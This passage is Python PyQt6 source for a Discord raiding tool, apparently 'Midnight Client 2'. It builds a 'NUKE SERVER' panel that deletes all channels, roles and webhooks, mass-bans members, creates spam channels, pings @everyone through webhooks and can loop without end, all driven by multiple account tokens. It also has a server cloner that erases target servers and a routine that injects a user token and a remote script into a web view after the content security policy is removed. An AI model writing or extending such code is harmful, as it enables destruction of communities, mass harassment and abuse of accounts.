        self.load_cloner_log_btn = MinimalButton("Load Layout")
        self.load_cloner_log_btn.setFixedHeight(35)
        self.load_cloner_log_btn.clicked.connect(self.load_clone_log)

        data_layout.addWidget(data_lbl)
        data_layout.addStretch()
        data_layout.addWidget(self.save_log_btn)
        data_layout.addWidget(self.load_cloner_log_btn)
        
        layout.addWidget(data_frame)

        # =================================================
        # 3. EXECUTION ACTIONS (Bottom Section)
        # =================================================
        action_lbl = QLabel("Execution Mode")
        action_lbl.setStyleSheet("color: #A0AEC0; font-size: 12px; font-weight: bold; text-transform: uppercase;")
        layout.addWidget(action_lbl)

        action_layout = QHBoxLayout()
        action_layout.setSpacing(15)

        # Standard Clone
        self.perfect_clone_btn = MinimalButton("Perfect Clone")
        self.perfect_clone_btn.setFixedHeight(50)
        self.perfect_clone_btn.setToolTip("Deletes channels/roles and recreates them based on the log.")
        self.perfect_clone_btn.clicked.connect(lambda: self.start_clone_mode("perfect_clone"))
        
        # Exact Clone (Includes Icon/Name)
        self.perfect_perfect_clone_btn = MinimalButton("Perfect Perfect Clone")
        self.perfect_perfect_clone_btn.setFixedHeight(50)
        self.perfect_perfect_clone_btn.setToolTip("Clones channels, roles, AND Server Name/Icon.")
        self.perfect_perfect_clone_btn.setStyleSheet("""
            QPushButton { 
                background: rgba(236, 201, 75, 0.15); 
                border: 1px solid rgba(236, 201, 75, 0.5); 
                color: #ECC94B; 
                font-weight: bold;
            }
            QPushButton:hover { background: rgba(236, 201, 75, 0.25); }
            QPushButton:disabled { background: transparent; border: 1px solid rgba(255,255,255,0.1); color: #555; }
        """)
        self.perfect_perfect_clone_btn.clicked.connect(lambda: self.start_clone_mode("perfect_perfect_clone"))

        action_layout.addWidget(self.perfect_clone_btn)
        action_layout.addWidget(self.perfect_perfect_clone_btn)
        
        layout.addLayout(action_layout)
        layout.addStretch()

        # Initial State
        self.perfect_clone_btn.setEnabled(False)
        self.perfect_perfect_clone_btn.setEnabled(False)
        self.save_log_btn.setEnabled(False)

        return widget




    def create_cloner_logs_tab(self):
        widget = QWidget()
        layout = QVBoxLayout(widget)
        layout.setContentsMargins(30, 30, 30, 30)
        layout.setSpacing(15)

        logs_label = QLabel("Cloner Logs")
        logs_label.setStyleSheet("color: white; font-size: 14px; font-weight: bold;")
        layout.addWidget(logs_label)

        self.cloner_logs = ModernTextEdit(self)
        self.cloner_logs.setReadOnly(True)
        layout.addWidget(self.cloner_logs)

        return widget




    def start_cloner_log(self):
        source_id = self.cloner_source_id_input.text().strip()
        
        # --- FIX: Validate Source ID ---
        if not source_id or not source_id.isdigit():
            self.cloner_log("[❌] Invalid Source Server ID. Must be numeric.")
            return
        # -------------------------------

        if not self.tokens:
            self.cloner_log("[❌] No tokens loaded.")
            return

        self.cloner_log(f"[▶️] Starting to log server {source_id}...")
        self.log_server_btn.setEnabled(False)

        cloner_bot = ServerClonerBot(self.tokens[0], self.log_server_btn)
        cloner_bot.mode = "log"
        cloner_bot.source_guild_id = source_id

        cloner_bot.update_signal.connect(self.cloner_log)
        cloner_bot.log_data_signal.connect(self.on_log_data_received)
        cloner_bot.finished_signal.connect(self.on_cloner_finished)

        self.running_bots.append(cloner_bot)
        self.set_stop_button_enabled.emit(True)
        cloner_bot.start()



    def start_clone_mode(self, mode):
        target_id = self.cloner_target_id_input.text().strip()
        
        # --- FIX: Validate Target ID ---
        if not target_id or not target_id.isdigit():
            self.cloner_log("[❌] Invalid Target Server ID. Must be numeric.")
            return
        # -------------------------------

        if not self.cloned_server_data:
            self.cloner_log("[❌] No server data loaded. Cannot clone.")
            return
        if not self.tokens:
            self.cloner_log("[❌] No tokens loaded.")
            return

        confirm_msg = f"This will ERASE and REBUILD the target server ({target_id}). This cannot be undone. Are you sure?"
        if mode == "perfect_perfect_clone":
            confirm_msg = f"This will ERASE and REBUILD the target server ({target_id}), including its name and icon. This cannot be undone. Are you sure?"

        reply = CustomMessageBox.warning(self, "Confirm Clone", confirm_msg, 
                                         QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No,
                                         QMessageBox.StandardButton.No)
        
        if reply == QMessageBox.StandardButton.No:
            self.cloner_log("[🛑] Clone operation cancelled.")
            return

        self.cloner_log(f"[▶️] Starting {mode.replace('_', ' ')}...")

        sender_button = self.sender()
        if sender_button: sender_button.setEnabled(False)

        cloner_bot = ServerClonerBot(self.tokens[0], sender_button)
        cloner_bot.mode = mode
        cloner_bot.target_guild_id = target_id
        cloner_bot.source_guild_id = self.cloned_server_data.get("metadata", {}).get("id")
        cloner_bot.cloned_data = self.cloned_server_data

        cloner_bot.update_signal.connect(self.cloner_log)
        cloner_bot.finished_signal.connect(self.on_cloner_finished)

        self.running_bots.append(cloner_bot)
        self.set_stop_button_enabled.emit(True)
        cloner_bot.start()

    def save_clone_log(self):
        if not self.cloned_server_data:
            self.cloner_log("[❌] No data to save. Please log a server first.")
            return

        default_name = f"{self.cloned_server_data.get('metadata', {}).get('name', 'server')}_clone.json"
        path, _ = QFileDialog.getSaveFileName(self, "Save Clone Log", default_name, "JSON Files (*.json)")
        if path:
            try:
                with open(path, 'w', encoding='utf-8') as f:
                    json.dump(self.cloned_server_data, f, indent=4)
                self.cloner_log(f"[✅] Log successfully saved to: {path}")
            except Exception as e:
                self.cloner_log(f"[❌] Failed to save log: {e}")



    def load_discord(self):
        """
        Handles the logic for logging into Discord and injecting Vencord.
        This now works because the CSP is removed by the interceptor.
        """
        if "discord.com/channels/@me" in self.web_view.url().toString():
            return
        
        if self.is_bot_mode or not self.tokens:
            self.web_view.setHtml("<h1>Web Client Disabled</h1>")
            return

        token = self.tokens[0]

        # Since the CSP is now gone, this simple script will work perfectly.
        script_content = f"""
        (function() {{
            // Part 1: Token Injection
            const iframe = document.createElement('iframe');
            document.body.appendChild(iframe);
            iframe.contentWindow.localStorage.setItem('token', `"{token}"`);
            
            // Part 2: Vencord Injection
            const vencordScript = document.createElement('script');
            vencordScript.src = 'https://vencord.dev/browser.js';
            vencordScript.defer = true;
            document.body.appendChild(vencordScript);

            // Part 3: Reload to apply
            setTimeout(() => {{
                iframe.remove();
                location.reload();
            }}, 500);
        }})();
        """

        def on_load_finished(ok):
            if "discord.com/login" in self.web_view.url().toString():
                self.log("[INFO] Login page loaded. Injecting token and Vencord...")
                self.web_view.page().runJavaScript(script_content)
                try: self.web_view.loadFinished.disconnect(on_load_finished)
                except TypeError: pass
        
        try: self.web_view.loadFinished.disconnect()
        except TypeError: pass
        self.web_view.loadFinished.connect(on_load_finished)
        self.web_view.setUrl(QUrl("https://discord.com/login"))



    def load_clone_log(self):
        path, _ = QFileDialog.getOpenFileName(self, "Load Clone Log", "", "JSON Files (*.json)")
        if path:
            try:
                with open(path, 'r', encoding='utf-8') as f:
                    self.cloned_server_data = json.load(f)

                metadata = self.cloned_server_data.get("metadata", {})
                server_name = metadata.get("name", "Unknown")
                server_id = metadata.get("id", "Unknown")
                self.cloner_source_id_input.setText(server_id)
                self.cloner_log(f"[✅] Successfully loaded log for server: {server_name} ({server_id})")
                self.display_loaded_data_summary()

                self.perfect_clone_btn.setEnabled(True)
                self.perfect_perfect_clone_btn.setEnabled(True)
                self.save_log_btn.setEnabled(True)

            except Exception as e:
                self.cloner_log(f"[❌] Failed to load log: {e}")
                self.cloned_server_data = {}

    def execute_command_from_listener(self, custom_command, context):
        self.log(f"[DIAGNOSTIC] Step 4: MainGUI received signal for command '{custom_command.name}'.")


        original_style = self.animated_background.styleSheet()
        self.animated_background.setStyleSheet("background-color: #550000;")
        QTimer.singleShot(150, lambda: self.animated_background.setStyleSheet(original_style))


        if self.is_command_executing:
            self.log("[DIAGNOSTIC] Step 5: Executor is busy. Ignoring command.")
            return

        self.is_command_executing = True
        self.log(f"[DIAGNOSTIC] Step 5: Locking executor for '{custom_command.name}'.")

        self.command_execution_thread = QThread()
        self.command_executor = CommandExecutorWorker(self, custom_command, context)
        self.command_executor.moveToThread(self.command_execution_thread)

        self.command_executor.log_signal.connect(self.log)
        self.command_execution_thread.started.connect(self.command_executor.execute)

        self.command_executor.finished.connect(self.on_command_execution_finished)
        self.command_executor.finished.connect(self.command_execution_thread.quit)
        self.command_executor.finished.connect(self.command_executor.deleteLater)
        self.command_execution_thread.finished.connect(self.command_execution_thread.deleteLater)

        self.command_execution_thread.start()

    def display_loaded_data_summary(self):
        if not self.cloned_server_data: return

        roles = len(self.cloned_server_data.get('roles', []))
        channels = len(self.cloned_server_data.get('channels', []))
        self.cloner_log(f"    - Roles: {roles}")
        self.cloner_log(f"    - Channels/Categories: {channels}")
        self.cloner_log("Ready to clone to a target server.")

    def set_cloner_buttons_enabled(self, enabled, initiating_button=None):
        if enabled:
            self.log_server_btn.setEnabled(True)
            self.load_cloner_log_btn.setEnabled(True)
            has_data = bool(self.cloned_server_data)
            self.perfect_clone_btn.setEnabled(has_data)
            self.perfect_perfect_clone_btn.setEnabled(has_data)
            self.save_log_btn.setEnabled(has_data)
        elif initiating_button:
            initiating_button.setEnabled(False)

    def on_cloner_finished(self, success, message, initiating_button: QPushButton = None):
        self.cloner_log(f"Cloner finished. Success: {success}. Message: {message}")
        if self.sender() in self.running_bots:
            self.running_bots.remove(self.sender())
        if initiating_button:
            initiating_button.setEnabled(True)
        self.set_stop_button_enabled.emit(bool(self.running_bots))

    def on_log_data_received(self, data):
        self.cloned_server_data = data
        self.display_loaded_data_summary()
        self.perfect_clone_btn.setEnabled(True)
        self.perfect_perfect_clone_btn.setEnabled(True)
        self.save_log_btn.setEnabled(True)

    def cloner_log(self, message):
        if self.cloner_logs:
            self.cloner_logs.append(f"[{datetime.now().strftime('%H:%M:%S')}] {message}")

    def member_log(self, message):
        self.members_log.append(f"[{datetime.now().strftime('%H:%M:%S')}] {message}")

    def command_gui_log(self, message):
        self.command_logs.append(f"[{datetime.now().strftime('%H:%M:%S')}] {message}")

    def create_main_functions_container(self):
        outer_container = QWidget(self)
        outer_container.setAttribute(Qt.WidgetAttribute.WA_TranslucentBackground)
        outer_layout = QHBoxLayout(outer_container)
        outer_layout.setContentsMargins(0, 0, 0, 0)
        outer_layout.addStretch(1)

        container = QWidget(outer_container)
        container.setMinimumSize(600, 400)
        container.setSizePolicy(QSizePolicy.Policy.Preferred, QSizePolicy.Policy.Expanding)
        container.setAttribute(Qt.WidgetAttribute.WA_TranslucentBackground)

        container_layout = QVBoxLayout(container)
        container_layout.setContentsMargins(0, 0, 0, 0)
        container_layout.setSpacing(0)

        section_title = QLabel("Main/Nuking functions", container)
        section_title.setAlignment(Qt.AlignmentFlag.AlignCenter)
        section_title.setStyleSheet(
            "color: white; font-size: 20px; font-weight: bold; padding: 15px; background: rgba(26, 32, 44, 0.7); border-top-left-radius: 15px; border-top-right-radius: 15px; margin-bottom: 0px;")
        container_layout.addWidget(section_title)

        tab_buttons_layout = QHBoxLayout()
        tab_buttons_layout.setContentsMargins(20, 0, 20, 0)
        tab_buttons_layout.setSpacing(5)
        tab_buttons_layout.setAlignment(Qt.AlignmentFlag.AlignLeft)

        self.main_func_tab_buttons.setExclusive(True)

        self.main_func_tabs_stack.setStyleSheet("""
            QStackedWidget {
                background: rgba(26, 32, 44, 0.7); border: 1px solid rgba(255, 255, 255, 0.1);
                border-top-right-radius: 15px; border-bottom-left-radius: 15px; border-bottom-right-radius: 15px;
                margin-top: 0px; box-shadow: inset 0 0 10px rgba(0, 0, 0, 0.2);
            }
        """)

        tab_names = ["Panel", "Changers", "Changers 2", "Status"]
        for i, name in enumerate(tab_names):
            tab_button = TabButton(name, container)
            tab_button.clicked.connect(lambda checked, index=i: self.switch_sub_tab(self.main_func_tabs_stack, index))
            tab_buttons_layout.addWidget(tab_button)
            self.main_func_tab_buttons.addButton(tab_button, i)

        self.main_func_tabs_stack.addWidget(self.create_panel_tab())
        self.main_func_tabs_stack.addWidget(self.create_changers_tab())
        self.main_func_tabs_stack.addWidget(self.create_more_changers_tab())
        self.main_func_tabs_stack.addWidget(self.create_status_tab())

        tab_buttons_layout.addStretch(1)

        container_layout.addLayout(tab_buttons_layout)
        container_layout.addWidget(self.main_func_tabs_stack)
        container_layout.addStretch(1)

        outer_layout.addWidget(container)
        outer_layout.addStretch(1)

        self.main_func_tab_buttons.button(0).setChecked(True)
        self.main_func_tabs_stack.setCurrentIndex(0)

        return outer_container





    def create_panel_tab(self):
        widget = QWidget()
        widget.setAttribute(Qt.WidgetAttribute.WA_TranslucentBackground)
        layout = QVBoxLayout(widget)
        layout.setContentsMargins(30, 30, 30, 30)
        layout.setSpacing(15)

        # =================================================
        # 1. SERVER ID INPUT (With Autofill & Icon Support)
        # =================================================
        server_id_layout = QHBoxLayout()
        server_id_layout.setSpacing(15)
        
        server_id_label = QLabel("Server ID / Name:")
        server_id_label.setStyleSheet("color: white; font-size: 12px;")
        
        self.server_id_input = ModernLineEdit()
        self.server_id_input.setPlaceholderText("Enter ID or Server Name...")
        
        # --- Connect Signal for Icon Logic ---
        # This triggers the logic to find the ID from the name and fetch the icon
        self.server_id_input.textChanged.connect(self.handle_server_input_change)
        
        # --- Setup QCompleter for Autofill ---
        from PyQt6.QtWidgets import QCompleter, QAbstractItemView
        self.server_completer = QCompleter([])
        self.server_completer.setCaseSensitivity(Qt.CaseSensitivity.CaseInsensitive)
        self.server_completer.setFilterMode(Qt.MatchFlag.MatchContains)
        
        # --- Style the Dropdown Popup (Dark Theme) ---
        popup = self.server_completer.popup()
        
        popup.setStyleSheet("""
            QAbstractItemView {
                background-color: rgba(18, 22, 33, 0.95); 
                color: white;
                border: 1px solid rgba(99, 179, 237, 0.3);
                border-radius: 4px;
                padding: 4px;
                font-size: 12px;
            }
            QAbstractItemView::item {
                padding: 6px;
                border-radius: 4px;
            }
            QAbstractItemView::item:selected {
                background-color: rgba(99, 179, 237, 0.2); 
                color: #63b3ed;
            }
            QScrollBar:vertical {
                width: 6px;
                background: transparent;
            }
            QScrollBar::handle:vertical {
                background: rgba(255, 255, 255, 0.2);
                border-radius: 3px;
            }
            QScrollBar::add-line:vertical, QScrollBar::sub-line:vertical { height: 0px; }
        """)
        self.server_id_input.setCompleter(self.server_completer)

        server_id_layout.addWidget(server_id_label)
        server_id_layout.addWidget(self.server_id_input)
        layout.addLayout(server_id_layout)

        # =================================================
        # 2. CHANNEL ID INPUT
        # =================================================
        channel_id_layout = QHBoxLayout()
        channel_id_layout.setSpacing(15)
        
        channel_id_label = QLabel("Channel ID:")
        channel_id_label.setStyleSheet("color: white; font-size: 12px;")
        
        self.channel_id_input = ModernLineEdit()
        self.channel_id_input.setPlaceholderText("Enter Channel ID...") # <-- Text Restored
        
        channel_id_layout.addWidget(channel_id_label)
        channel_id_layout.addWidget(self.channel_id_input)
        layout.addLayout(channel_id_layout)

        # =================================================
        # 3. MESSAGE INPUT
        # =================================================
        message_label = QLabel("Message(s) (One per line): its global btw")
        message_label.setStyleSheet("color: white; font-size: 12px;")
        
        self.message_input = ModernTextEdit()
        self.message_input.setPlaceholderText("idk\nraid\ngg")
        self.message_input.setFixedHeight(120) 
        
        layout.addWidget(message_label)
        layout.addWidget(self.message_input)

        # =================================================
        # 4. OPTIONS & BUTTONS
        # =================================================
        self.random_message_check = AnimatedCheckBox("Send Random Message From List")
        self.random_message_check.setChecked(True)
        self.random_message_check.setToolTip("If checked, a random line from the box above will be sent.\nIf unchecked, the entire text content is sent as one message.")
        layout.addWidget(self.random_message_check)

        self.nuke_btn = AnimatedGradientButton("NUKE SERVER")
        self.nuke_btn.clicked.connect(self.start_nuke)
        layout.addWidget(self.nuke_btn)

        layout.addStretch()
        return widget






# Add these new methods to MainGUI class



    def handle_server_input_change(self, text):
        """Called when user types in the Server ID box."""
        text = text.strip()
        
        # Clear existing icon if text is empty
        if not text:
            # Reset padding to default
            current_style = self.server_id_input.styleSheet()
            # Remove the padding-right if we added it previously
            if "padding-right: 50px;" in current_style:
                new_style = current_style.replace("QLineEdit { padding-right: 50px; }", "")
                self.server_id_input.setStyleSheet(new_style)
            
            # Hide the label if it exists
            if hasattr(self, 'server_input_icon_label'):
                self.server_input_icon_label.hide()
            return

        # Check if valid Name in cache
        if text in self.server_name_cache:
            data = self.server_name_cache[text]
            guild_id = data['id']
            icon_hash = data['icon']
            
            if icon_hash:
                # Construct URL
                ext = "gif" if icon_hash.startswith("a_") else "png"
                url = f"https://cdn.discordapp.com/icons/{guild_id}/{icon_hash}.{ext}?size=64"
                self.fetch_and_set_input_icon(url)

    def set_input_icon(self, pixmap):
        """Sets the icon at the END of the input bar using a QLabel for custom size/pos."""
        if not pixmap or pixmap.isNull(): return

        # Remove old actions just in case (cleanup from old logic)
        for action in self.server_id_input.actions():
            self.server_id_input.removeAction(action)

        # --- 1. Create the rounded 32x32 Icon (REQUESTED SIZE) ---
        size = 32 
        rounded = QPixmap(size, size)
        rounded.fill(Qt.GlobalColor.transparent)
        painter = QPainter(rounded)
        painter.setRenderHint(QPainter.RenderHint.Antialiasing)
        path = QPainterPath()
        path.addEllipse(0, 0, size, size)
        painter.setClipPath(path)
        # Scale original pixmap to 32x32 smoothly
        painter.drawPixmap(0, 0, size, size, pixmap.scaled(size, size, Qt.AspectRatioMode.KeepAspectRatioByExpanding, Qt.TransformationMode.SmoothTransformation))
        painter.end()

        self.current_server_icon_pixmap = rounded

        # --- 2. Create/Config Label logic ---
        # We use a QLabel inside the LineEdit because QAction icons are size-locked by Qt
        if not hasattr(self, 'server_input_icon_label'):
            self.server_input_icon_label = QLabel(self.server_id_input)
            self.server_input_icon_label.setScaledContents(True)
            self.server_input_icon_label.setFixedSize(size, size)
            self.server_input_icon_label.setStyleSheet("background: transparent; border: none;")
            self.server_input_icon_label.setCursor(Qt.CursorShape.ArrowCursor) 

            # Create a layout inside the LineEdit to position the icon
            layout = QHBoxLayout(self.server_id_input)
            # (Left, Top, Right, Bottom) -> Right 10 is the requested "Move 10px <-"
            layout.setContentsMargins(0, 0, 10, 0) 
            layout.addStretch()
            layout.addWidget(self.server_input_icon_label)
            
            # Adjust text padding so text doesn't type behind the icon
            # 10px margin + 32px icon + 8px buffer = 50px
            current_style = self.server_id_input.styleSheet()
            self.server_id_input.setStyleSheet(current_style + "QLineEdit { padding-right: 50px; }")

        # --- 3. Set the Pixmap ---
        self.server_input_icon_label.setPixmap(rounded)
        self.server_input_icon_label.show()



    def fetch_and_set_input_icon(self, url):
        """Starts background thread to get icon."""
        self.icon_thread = QThread()
        self.icon_worker = IconDownloader(url)
        self.icon_worker.moveToThread(self.icon_thread)
        
        self.icon_worker.finished.connect(self.set_input_icon)
        self.icon_worker.finished.connect(self.icon_thread.quit)
        self.icon_worker.finished.connect(self.icon_worker.deleteLater)
        self.icon_thread.finished.connect(self.icon_thread.deleteLater)
        
        self.icon_thread.started.connect(self.icon_worker.run)
        self.icon_thread.start()



    def update_server_list(self, guild_map):
        """Updates the cache and the autocomplete model."""
        self.server_name_cache = guild_map
        
        # Update the completer with the server names
        from PyQt6.QtCore import QStringListModel
        model = QStringListModel(list(guild_map.keys()))
        self.server_completer.setModel(model)




    def select_server_pfp(self):
        file_path, _ = QFileDialog.getOpenFileName(self, "Select Server PFP", "",
                                                   "Image Files (*.png *.jpg *.jpeg *.gif)")
        if file_path:
            self.selected_pfp_path = file_path
            self.pfp_path_input.setText(os.path.basename(file_path))
            pixmap = QPixmap(file_path)
            self.pfp_preview_label.setPixmap(pixmap.scaled(40, 40, Qt.AspectRatioMode.KeepAspectRatio, Qt.TransformationMode.SmoothTransformation))
            self.log(f"[🖼️] Server PFP selected: {file_path}")


    def configure_for_bot_mode(self):
        self.log("[INFO] BOT MODE ACTIVATED. UI has been adjusted.")
        
        # 1. Disable buttons that Bots cannot use
        self.btn_members.setEnabled(False)
        self.btn_cloner.setEnabled(False)
        self.btn_commands.setEnabled(False)
        
        # 2. FORCE ENABLE the AI Companion button
        self.btn_ai_chat.setEnabled(True) 

        # 3. Handle Status Changer (Bots can't use the User status endpoint)
        status_tab_button = self.main_func_tab_buttons.button(3) 
        if status_tab_button:
            status_tab_button.setEnabled(False)
            status_tab_button.setToolTip("Status Changer is not available for bots.")
        
        if hasattr(self, 'start_status_changer_btn') and self.start_status_changer_btn:
            self.start_status_changer_btn.setEnabled(False)
            self.start_status_changer_btn.setText("STATUS CHANGER (USERS ONLY)")

        # 4. Show Bot-specific options
        if hasattr(self, 'spam_on_create_check') and self.spam_on_create_check:
            self.spam_on_create_check.show()

        self.parent().parent().setWindowTitle("Midnight Client 2 (BOT MODE)")





    def create_changers_tab(self):
        widget = QWidget()
        widget.setAttribute(Qt.WidgetAttribute.WA_TranslucentBackground)
        layout = QVBoxLayout(widget)
        layout.setContentsMargins(30, 30, 30, 30)
        layout.setSpacing(15)

        options_group = QGroupBox("Nuke Options (for NUKE SERVER button only)")
        options_group.setStyleSheet("""
            QGroupBox { color: rgba(255, 255, 255, 0.8); font-size: 14px; border: 1px solid rgba(255, 255, 255, 0.2); border-radius: 10px; margin-top: 10px; }
            QGroupBox::title { subcontrol-origin: margin; left: 10px; padding: 0 3px; color: white; }
        """)
        options_layout = QVBoxLayout(options_group)

        self.delete_channels_check = AnimatedCheckBox("Delete All Channels")
        self.delete_channels_check.setChecked(True)
        options_layout.addWidget(self.delete_channels_check)

        self.delete_roles_check = AnimatedCheckBox("Delete All Roles")
        self.delete_roles_check.setChecked(True)
        options_layout.addWidget(self.delete_roles_check)

        self.delete_webhooks_check = AnimatedCheckBox("Delete All Webhooks")
        self.delete_webhooks_check.setChecked(True)
        options_layout.addWidget(self.delete_webhooks_check)

        self.give_all_other_tokens_best_role_check = AnimatedCheckBox("Give all other tokens best role")
        self.give_all_other_tokens_best_role_check.setChecked(False)
        options_layout.addWidget(self.give_all_other_tokens_best_role_check)

        self.create_spam_check = AnimatedCheckBox("Create Spam Channels (Timed)")
        self.create_spam_check.setChecked(False)
        options_layout.addWidget(self.create_spam_check)

        self.channel_creation_duration_widget = QWidget()
        channel_creation_duration_layout = QHBoxLayout(self.channel_creation_duration_widget)
        channel_creation_duration_layout.setContentsMargins(20, 5, 0, 5)
        channel_creation_duration_label = QLabel("Creation Duration (s):")
        channel_creation_duration_label.setStyleSheet("color: white; font-size: 12px;")
        self.channel_creation_duration_slider = AnimatedSlider(Qt.Orientation.Horizontal)
        self.channel_creation_duration_slider.setRange(5, 120)
        self.channel_creation_duration_slider.setValue(10) # Default to 10s
        self.channel_creation_duration_value_label = QLabel("10")
        self.channel_creation_duration_value_label.setStyleSheet("color: white; font-size: 12px;")
        self.channel_creation_duration_slider.valueChanged.connect(
            lambda v: self.channel_creation_duration_value_label.setText(str(v)))
        channel_creation_duration_layout.addWidget(channel_creation_duration_label)
        channel_creation_duration_layout.addWidget(self.channel_creation_duration_slider)
        channel_creation_duration_layout.addWidget(self.channel_creation_duration_value_label)
        options_layout.addWidget(self.channel_creation_duration_widget)
        self.channel_creation_duration_widget.setVisible(False)

        self.create_6_channels_check = AnimatedCheckBox("Create 6 Channels (Fixed)")
        self.create_6_channels_check.setChecked(False)
        options_layout.addWidget(self.create_6_channels_check)
        

        self.spam_on_create_check = AnimatedCheckBox("Spam Channel on Creation (Bots Only)")
        self.spam_on_create_check.setToolTip("During a nuke, immediately sends a message to each channel right after it's created.")
        self.spam_on_create_check.setChecked(True)
        options_layout.addWidget(self.spam_on_create_check)
        self.spam_on_create_check.hide() # Hidden by default, shown in bot mode

        self.spam_all_post_nuke_check = AnimatedCheckBox("Spam All Channels Post-Nuke")
        self.spam_all_post_nuke_check.setChecked(False)
        options_layout.addWidget(self.spam_all_post_nuke_check)
        
        self.use_webhook_ping_check = AnimatedCheckBox("Use Webhooks for Pinging (@everyone)")
        self.use_webhook_ping_check.setChecked(False)
        options_layout.addWidget(self.use_webhook_ping_check)

        self.post_nuke_spam_layout = QWidget()
        post_nuke_spam_layout_inner = QHBoxLayout(self.post_nuke_spam_layout)
        post_nuke_spam_label = QLabel("Messages/Pings per Channel:")
        post_nuke_spam_label.setStyleSheet("color: white; font-size: 12px; margin-left: 20px;")
        self.post_nuke_spam_slider = AnimatedSlider(Qt.Orientation.Horizontal)
        self.post_nuke_spam_slider.setRange(1, 50)
        self.post_nuke_spam_slider.setValue(5)
        self.post_nuke_spam_value_label = QLabel("5")
        self.post_nuke_spam_value_label.setStyleSheet("color: white; font-size: 12px;")
        self.post_nuke_spam_slider.valueChanged.connect(lambda v: self.post_nuke_spam_value_label.setText(str(v)))
        post_nuke_spam_layout_inner.addWidget(post_nuke_spam_label)
        post_nuke_spam_layout_inner.addWidget(self.post_nuke_spam_slider)
        post_nuke_spam_layout_inner.addWidget(self.post_nuke_spam_value_label)
        options_layout.addWidget(self.post_nuke_spam_layout)

        self.infinite_loop_check = AnimatedCheckBox("Infinite Loop Mode (for Nuke)")
        self.infinite_loop_check.setChecked(False)
        options_layout.addWidget(self.infinite_loop_check)

        # Connections for UI logic
        self.create_spam_check.toggled.connect(self.channel_creation_duration_widget.setVisible)
        self.create_spam_check.toggled.connect(lambda checked: self.create_6_channels_check.setChecked(not checked) if checked else None)
        self.create_6_channels_check.toggled.connect(lambda checked: self.create_spam_check.setChecked(not checked) if checked else None)

        def toggle_spam_slider_visibility():
            is_visible = self.spam_all_post_nuke_check.isChecked() or self.use_webhook_ping_check.isChecked()
            self.post_nuke_spam_layout.setVisible(is_visible)
        
        self.spam_all_post_nuke_check.toggled.connect(toggle_spam_slider_visibility)
        self.use_webhook_ping_check.toggled.connect(toggle_spam_slider_visibility)
        toggle_spam_slider_visibility()

        layout.addWidget(options_group)
        layout.addStretch()
        return widget

    def create_more_changers_tab(self):
        widget = QWidget()
        widget.setAttribute(Qt.WidgetAttribute.WA_TranslucentBackground)
        layout = QVBoxLayout(widget)
        layout.setContentsMargins(30, 30, 30, 30)
        layout.setSpacing(15)

        names_group = QGroupBox("Custom Nuke Names")
        names_group.setStyleSheet("""
            QGroupBox { color: white; font-size: 14px; border: 1px solid rgba(255, 255, 255, 0.2); border-radius: 10px; margin-top: 10px; }
            QGroupBox::title { subcontrol-origin: margin; left: 10px; padding: 0 3px; color: white; }
        """)
        names_layout = QGridLayout(names_group)
        names_layout.setSpacing(10)

        self.rename_server_check = AnimatedCheckBox("Rename Server")
        self.rename_server_check.setChecked(True)
        names_layout.addWidget(self.rename_server_check, 0, 0, 1, 2)

        server_name_label = QLabel("Server Name:")
        server_name_label.setStyleSheet("color: white;")
        self.custom_server_name_input = QLineEdit()
        self.custom_server_name_input.setPlaceholderText("Enter custom server name...")
        self.custom_server_name_input.setStyleSheet(
            "QLineEdit { padding: 4px 8px; border-radius: 4px; color: white; background-color: rgba(0,0,0,0.4); }")
        names_layout.addWidget(self.custom_server_name_input, 1, 1)
        names_layout.addWidget(server_name_label, 1, 0)

        channel_name_label = QLabel("Channel Name:")
        channel_name_label.setStyleSheet("color: white;")
        self.custom_channel_name_input = QLineEdit()
        self.custom_channel_name_input.setPlaceholderText("Enter custom channel name...")
        self.custom_channel_name_input.setStyleSheet(
            "QLineEdit { padding: 4px 8px; border-radius: 4px; color: white; background-color: rgba(0,0,0,0.4); }")
        names_layout.addWidget(self.custom_channel_name_input, 2, 1)
        names_layout.addWidget(channel_name_label, 2, 0)

        self.rename_server_check.toggled.connect(self.custom_server_name_input.setEnabled)

        layout.addWidget(names_group)

        ban_group = QGroupBox("Mass Ban")
        ban_group.setStyleSheet(names_group.styleSheet())
        ban_layout = QHBoxLayout(ban_group)

        self.ban_all_check = AnimatedCheckBox("Ban All Members on Nuke")
        self.ban_all_check.toggled.connect(self.show_ban_all_warning)
        ban_layout.addWidget(self.ban_all_check)

        detected_label = QLabel("(RISKY)")
        detected_label.setStyleSheet("color: #E53E3E; font-size: 10px; font-style: italic;")
        ban_layout.addWidget(detected_label)
        ban_layout.addStretch()

        layout.addWidget(ban_group)

        pfp_group = QGroupBox("Set Server PFP")
        pfp_group.setStyleSheet(names_group.styleSheet())
        pfp_layout = QHBoxLayout(pfp_group)
        pfp_layout.setContentsMargins(10, 10, 10, 10)
        pfp_layout.setSpacing(10)

        self.pfp_preview_label = QLabel()
        self.pfp_preview_label.setFixedSize(40, 40)
        self.pfp_preview_label.setStyleSheet(
            "border: 1px solid rgba(255, 255, 255, 0.2); border-radius: 20px; background: rgba(0,0,0,0.2);")
        self.pfp_preview_label.setAlignment(Qt.AlignmentFlag.AlignCenter)
        pfp_layout.addWidget(self.pfp_preview_label)

        self.pfp_path_input = QLineEdit()
        self.pfp_path_input.setPlaceholderText("Click button to select PFP...")
        self.pfp_path_input.setReadOnly(True)
        self.pfp_path_input.setStyleSheet(
            "QLineEdit { background: rgba(26, 32, 44, 0.6); border: 1.5px solid rgba(74, 85, 104, 0.4); border-radius: 8px; color: white; padding: 0px 10px; }")
        pfp_layout.addWidget(self.pfp_path_input)

        select_pfp_btn = QPushButton("Select PFP")
        select_pfp_btn.setFixedSize(120, 36)
        select_pfp_btn.setStyleSheet(
            "QPushButton { background: transparent; border: 1px solid rgba(255, 255, 255, 0.2); border-radius: 8px; color: rgba(255, 255, 255, 0.9); } QPushButton:hover { background: rgba(255, 255, 255, 0.05); }")
        select_pfp_btn.clicked.connect(self.select_server_pfp)
        pfp_layout.addWidget(select_pfp_btn)

        layout.addWidget(pfp_group)
        layout.addStretch()
        return widget

    def show_ban_all_warning(self, checked):
        # This function is only triggered when the checkbox state changes.
        # We only want to show the warning when the user is trying to CHECK it.
        if checked:
            reply = CustomMessageBox.question(
                self, 
                "Ban All Warning",
                "Using the mass ban feature carries a high risk of your account being disabled or requiring phone number verification.\n\nAre you sure you want to enable this option?",
                QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No, 
                QMessageBox.StandardButton.No
            )

            if reply == QMessageBox.StandardButton.No:
                # We block signals temporarily to prevent this setChecked call
                # from triggering this same warning function again in a loop.
